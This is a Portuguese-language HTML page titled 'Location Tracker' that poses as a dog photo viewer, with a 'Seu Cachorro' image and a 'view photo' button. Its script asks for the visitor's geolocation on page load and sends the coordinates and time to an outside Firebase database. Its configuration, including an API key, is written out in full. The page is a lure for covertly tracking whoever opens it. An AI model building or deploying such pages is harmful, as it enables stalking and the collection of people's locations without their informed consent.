<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #fffdf5;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        .thumbnail {
            width: 100%;
            height: 250px;
            border-radius: 12px;
            object-fit: cover;
            margin-bottom: 25px;
            cursor: pointer;
        }
        button {
            width: 100%;
            padding: 14px 20px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        .btn-primary {
            background: #218085;
            color: white;
        }
        .btn-primary:hover {
            background: #1d7480;
            transform: translateY(-2px);
        }
        .results { display: none; }
        .results.active { display: block; }
        .result-item {
            background: rgba(33, 128, 141, 0.06);
            border-left: 4px solid #218085;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 6px;
        }
        .result-label {
            color: #626c71;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        .result-value {
            color: #134252;
            font-size: 16px;
            font-weight: 600;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .error { display: none; color: #c01530; background: rgba(192, 21, 47, 0.1); padding: 15px; border-radius: 6px; margin-bottom: 20px; }
        .error.active { display: block; }
        .loading { display: none; text-align: center; color: #626c71; }
        .loading.active { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(33, 128, 141, 0.2);
            border-top-color: #218085;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .map-button { background: #218085; color: white; width: 100%; padding: 12px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 300'%3E%3Crect fill='%23667eea' width='400' height='300'/%3E%3Ctext x='50%' y='50%' font-size='48' fill='white' text-anchor='middle' dominant-baseline='middle'%3Eüêï Seu Cachorro%3C/text%3E%3C/svg%3E" alt="Thumbnail" class="thumbnail" id="thumbnailBtn" style="cursor:pointer">

        
        <button class="btn-primary" id="getLocationBtn">üéØ Visualizar foto</button>

        <div class="loading" id="loading">
            <span class="spinner"></span> Localizando...
        </div>

        <div class="error" id="error"></div>

        <div class="results" id="results">
            <div class="result-item">
                <div class="result-label">Latitude</div>
                <div class="result-value" id="latitude">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Longitude</div>
                <div class="result-value" id="longitude">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Precis√£o (metros)</div>
                <div class="result-value" id="accuracy">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Altitude (metros)</div>
                <div class="result-value" id="altitude">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Timestamp</div>
                <div class="result-value" id="timestamp">-</div>
            </div>
            <button class="map-button" id="mapBtn">üó∫Ô∏è Ver no Mapa</button>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAueHmQZ8DbpOl2ZnS4p7zw5kLyNGJ4K8o",
            authDomain: "location-tracker-e3ee8.firebaseapp.com",
            projectId: "location-tracker-e3ee8",
            storageBucket: "location-tracker-e3ee8.firebasestorage.app",
            messagingSenderId: "362391545154",
            appId: "1:362391545154:web:c9d60b45370e304f9554db",
            databaseURL: "https://location-tracker-e3ee8-default-rtdb.firebaseio.com"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const getLocationBtn = document.getElementById('getLocationBtn');
        const mapBtn = document.getElementById('mapBtn');
        const thumbnailBtn = document.getElementById('thumbnailBtn');
        const loading = document.getElementById('loading');
        const error = document.getElementById('error');
        const results = document.getElementById('results');

        let currentPosition = null;

        function getLocation() {
            error.style.display = 'none';
            results.style.display = 'none';
            loading.style.display = 'block';

            navigator.geolocation.getCurrentPosition(pos => {
                const coords = pos.coords;
                const date = new Date(pos.timestamp).toLocaleString('pt-BR');
                
                document.getElementById('latitude').textContent = coords.latitude.toFixed(6);
                document.getElementById('longitude').textContent = coords.longitude.toFixed(6);
                document.getElementById('accuracy').textContent = coords.accuracy ? coords.accuracy.toFixed(2) : 'N/A';
                document.getElementById('altitude').textContent = coords.altitude ? coords.altitude.toFixed(2) : 'N/A';
                document.getElementById('timestamp').textContent = date;

                currentPosition = { lat: coords.latitude, lon: coords.longitude };
                
                loading.style.display = 'none';
                results.style.display = 'block';

                // Salvar no Firebase
                db.ref('locations').push({
                    latitude: coords.latitude.toFixed(6),
                    longitude: coords.longitude.toFixed(6),
                    dataHora: date,
                    timestamp: new Date().getTime()
                }).then(() => {
                    alert('‚úÖ Localiza√ß√£o enviada!');
                }).catch(err => {
                    console.error('Erro:', err);
                });
            }, err => {
                loading.style.display = 'none';
                error.style.display = 'block';
                error.textContent = '‚ùå ' + err.message;
            });
        }

        getLocationBtn.addEventListener('click', getLocation);
        mapBtn.addEventListener('click', () => {
            if(currentPosition) window.open(`https://www.openstreetmap.org/#map=15/${currentPosition.lat}/${currentPosition.lon}`, '_blank');
        });
        thumbnailBtn.addEventListener('click', () => window.open('https://agi-prod-file-upload-public-main-use1.s3.amazonaws.com/411f4842-eef2-4672-a99f-881faf27eb78', '_blank'));

        window.addEventListener('load', getLocation);
    </script>
</body>
</html>
